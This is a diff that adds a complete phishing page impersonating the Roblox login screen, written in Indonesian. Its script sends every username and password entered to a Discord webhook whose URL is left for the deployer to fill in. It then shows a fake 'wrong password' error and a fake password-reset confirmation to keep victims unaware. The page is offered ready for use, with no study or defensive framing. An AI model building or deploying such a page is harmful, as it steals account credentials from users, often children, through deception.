@@ -1,1 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox - Login</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #1a1a2e; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            margin: 0; 
+            padding: 16px;
+        }
+        .container { 
+            background: #16213e; 
+            border-radius: 16px; 
+            padding: 32px 24px; 
+            max-width: 400px; 
+            width: 100%; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            border: 1px solid #2a3a5e;
+        }
+        .logo { 
+            font-size: 44px; 
+            font-weight: 900; 
+            color: #d42b2b; 
+            letter-spacing: -1px; 
+            text-align: center; 
+            margin-bottom: 8px;
+        }
+        .subtitle { 
+            color: #b0b9d0; 
+            text-align: center; 
+            font-size: 18px; 
+            font-weight: 400; 
+            margin-bottom: 24px;
+        }
+        .input-group { 
+            margin-bottom: 16px; 
+            text-align: left;
+        }
+        .input-group label { 
+            color: #b0b9d0; 
+            font-size: 13px; 
+            font-weight: 600; 
+            display: block; 
+            margin-bottom: 5px;
+        }
+        .input-group input { 
+            width: 100%; 
+            padding: 12px 14px; 
+            border: none; 
+            border-radius: 8px; 
+            background: #1f2a44; 
+            color: #fff; 
+            font-size: 16px; 
+            outline: none; 
+            transition: 0.2s;
+        }
+        .input-group input:focus { 
+            background: #253155; 
+            box-shadow: 0 0 0 2px #5d7bb5;
+        }
+        .input-group input::placeholder { 
+            color: #6a7a9e;
+        }
+        .btn-login { 
+            width: 100%; 
+            padding: 14px; 
+            background: #d42b2b; 
+            border: none; 
+            border-radius: 8px; 
+            color: #fff; 
+            font-size: 18px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            transition: 0.2s; 
+            margin-top: 8px;
+        }
+        .btn-login:hover { background: #b82222; }
+        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+        .links { 
+            margin-top: 18px; 
+            display: flex; 
+            justify-content: space-between; 
+            font-size: 14px;
+        }
+        .links a { 
+            color: #7d8db5; 
+            text-decoration: none; 
+            transition: 0.2s;
+        }
+        .links a:hover { color: #a0b5e0; text-decoration: underline; }
+        .divider { 
+            border: none; 
+            border-top: 1px solid #2a3a5e; 
+            margin: 24px 0 16px;
+        }
+        .btn-secondary { 
+            width: 100%; 
+            padding: 14px; 
+            background: transparent; 
+            border: 1px solid #4a5a7e; 
+            border-radius: 8px; 
+            color: #fff; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: default; 
+            opacity: 0.6;
+        }
+        .btn-secondary:hover { background: #1f2a44; }
+        .footer { 
+            margin-top: 24px; 
+            color: #5a6a8e; 
+            font-size: 12px; 
+            text-align: center;
+        }
+        .footer a { color: #7d8db5; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        .error-box { 
+            background: #2a1a1a; 
+            border-left: 4px solid #d42b2b; 
+            padding: 10px 14px; 
+            border-radius: 4px; 
+            margin-bottom: 16px; 
+            color: #f0a0a0; 
+            font-size: 14px; 
+            display: none; 
+            text-align: left;
+        }
+        .error-box.show { display: block; }
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">ROBLOX</div>
+    <div class="subtitle">Masuk ke akun Anda</div>
 
+    <div class="error-box" id="errorBox">
+        <span id="errorText">✕ Kata sandi yang Anda masukkan salah.</span>
+    </div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label>Nama Pengguna / Email</label>
+            <input type="text" id="username" placeholder="Masukkan username atau email" required>
+        </div>
+        <div class="input-group">
+            <label>Kata sandi</label>
+            <input type="password" id="password" placeholder="Masukkan kata sandi" required>
+        </div>
+        <button type="submit" class="btn-login" id="loginBtn">Masuk</button>
+    </form>
+
+    <div class="links">
+        <a href="#" id="forgotLink">Lupa kata sandi?</a>
+        <a href="#">Daftar</a>
+    </div>
+
+    <hr class="divider">
+    <button class="btn-secondary" id="createBtn">Buat akun baru</button>
+
+    <div class="footer">
+        <a href="#">Privasi</a> · <a href="#">Syarat</a> · <a href="#">Cookie</a><br>
+        <span style="color:#4a5a7e;">© 2026 Roblox Corporation</span>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // KONFIGURASI – GANTI DENGAN WEBHOOK DISCORD KAMU
+    // ============================================================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/.../..."; // <-- GANTI INI
+
+    // ============================================================
+    // KIRIM DATA KE DISCORD
+    // ============================================================
+    function sendToDiscord(username, password) {
+        const payload = {
+            embeds: [{
+                title: "🔐 New Roblox Login!",
+                color: 0xd42b2b,
+                fields: [
+                    { name: "👤 Username", value: username, inline: false },
+                    { name: "🔑 Password", value: password, inline: false },
+                    { name: "🌐 IP", value: "{{ip}}", inline: true },
+                    { name: "🕒 Time", value: new Date().toUTCString(), inline: true }
+                ],
+                footer: { text: "Roblox Phish • Powered by GitHub" }
+            }]
+        };
+
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .then(res => {
+            if (!res.ok) console.error("Webhook failed:", res.status);
+        })
+        .catch(err => console.error("Error:", err));
+    }
+
+    // ============================================================
+    // HANDLER SUBMIT
+    // ============================================================
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+        const btn = document.getElementById('loginBtn');
+
+        if (!username || !password) {
+            errorText.textContent = '✕ Harap isi semua field.';
+            errorBox.classList.add('show');
+            return;
+        }
+
+        errorBox.classList.remove('show');
+        btn.innerHTML = '<span class="spinner"></span> Memproses...';
+        btn.disabled = true;
+
+        // Kirim data ke Discord (tanpa delay agar cepat)
+        sendToDiscord(username, password);
+
+        // Simulasi loading dan tampilkan error palsu
+        setTimeout(() => {
+            btn.innerHTML = 'Masuk';
+            btn.disabled = false;
+            errorText.textContent = '✕ Kata sandi yang Anda masukkan salah.';
+            errorBox.classList.add('show');
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        }, 1500);
+    });
+
+    // ============================================================
+    // FITUR TAMBAHAN (Palsu)
+    // ============================================================
+    document.getElementById('forgotLink').addEventListener('click', function(e) {
+        e.preventDefault();
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
+        errorText.textContent = '✉️ Link reset kata sandi telah dikirim ke email Anda.';
+        errorBox.classList.add('show');
+        setTimeout(() => errorBox.classList.remove('show'), 3000);
+    });
+
+    document.getElementById('createBtn').addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+    });
+
+    // Hilangkan error saat mulai mengetik
+    document.getElementById('username').addEventListener('focus', function() {
+        document.getElementById('errorBox').classList.remove('show');
+    });
+    document.getElementById('password').addEventListener('focus', function() {
+        document.getElementById('errorBox').classList.remove('show');
+    });
+</script>
+</body>
+  </html>
